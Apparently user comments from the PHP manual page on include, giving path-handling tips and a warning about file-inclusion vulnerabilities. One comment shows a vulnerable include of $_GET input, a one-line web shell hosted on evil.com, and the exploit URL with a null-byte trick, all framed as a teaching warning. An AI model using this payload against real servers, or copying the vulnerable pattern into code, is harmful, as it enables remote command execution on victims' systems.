# Security warning





This might be useful:


```
<?php
include $_SERVER[&apos;DOCUMENT_ROOT&apos;].&quot;/lib/sample.lib.php&quot;;
?>
```

So you can move script anywhere in web-project tree without changes.

  

#



If you want to have include files, but do not want them to be accessible directly from the client side, please, please, for the love of keyboard, do not do this:



```
<?php

# index.php
define(&apos;what&apos;, &apos;ever&apos;);
include &apos;includeFile.php&apos;;

# includeFile.php

// check if what is defined and die if not

?>
```


The reason you should not do this is because there is a better option available. Move the includeFile(s) out of the document root of your project. So if the document root of your project is at &quot;/usr/share/nginx/html&quot;, keep the include files in &quot;/usr/share/nginx/src&quot;.



```
<?php

# index.php (in document root (/usr/share/nginx/html))

include __DIR__ . &apos;/../src/includeFile.php&apos;;

?>
```


Since user can&apos;t type &apos;your.site/../src/includeFile.php&apos;, your includeFile(s) would not be accessible to the user directly.

  

#



Before using php&apos;s include, require, include_once or require_once statements, you should learn more about Local File Inclusion (also known as LFI) and Remote File Inclusion (also known as RFI).

As example #3 points out, it is possible to include a php file from a remote server.

The LFI and RFI vulnerabilities occur when you use an input variable in the include statement without proper input validation.&#xA0; Suppose you have an example.php with code:



```
<?php
// Bad Code
$path = $_GET[&apos;path&apos;];
include $path . &apos;example-config-file.php&apos;;
?>
```


As a programmer, you might expect the user to browse to the path that you specify.

However, it opens up an RFI vulnerability.&#xA0; To exploit it as an attacker, I would first setup an evil text file with php code on my evil.com domain.

evil.txt


```
<?php echo shell_exec($_GET[&apos;command&apos;]);?>
```


It is a text file so it would not be processed on my server but on the target/victim server.&#xA0; I would browse to:
h t t p : / / w w w .example.com/example.php?command=whoami&amp; path= h t t p : / / w w w .evil.com/evil.txt%00

The example.php would download my evil.txt and process the operating system command that I passed in as the command variable.&#xA0; In this case, it is whoami.&#xA0; I ended the path variable with a %00, which is the null character.&#xA0; The original include statement in the example.php would ignore the rest of the line.&#xA0; It should tell me who the web server is running as.

Please use proper input validation if you use variables in an include statement.

  

#



I cannot emphasize enough knowing the active working directory. Find it by: echo getcwd();
Remember that if file A includes file B, and B includes file C; the include path in B should take into account that A, not B, is the active working directory.

  

#



As a rule of thumb, never include files using relative paths. To do this efficiently, you can define constants as follows:

----


```
<?php // prepend.php - autoprepended at the top of your tree
define(&apos;MAINDIR&apos;,dirname(__FILE__) . &apos;/&apos;);
define(&apos;DL_DIR&apos;,MAINDIR . &apos;downloads/&apos;);
define(&apos;LIB_DIR&apos;,MAINDIR . &apos;lib/&apos;);
?>
```

----

and so on. This way, the files in your framework will only have to issue statements such as this:



```
<?php
require_once(LIB_DIR . &apos;excel_functions.php&apos;);
?>
```


This also frees you from having to check the include path each time you do an include.

If you&apos;re running scripts from below your main web directory, put a prepend.php file in each subdirectory:

--


```
<?php
include(dirname(dirname(__FILE__)) . &apos;/prepend.php&apos;);
?>
```

--

This way, the prepend.php at the top always gets executed and you&apos;ll have no path handling headaches. Just remember to set the auto_prepend_file directive on your .htaccess files for each subdirectory where you have web-accessible scripts.

  

#

[Official documentation page](https://www.php.net/manual/en/function.include.php)

**[To root](/README.md)**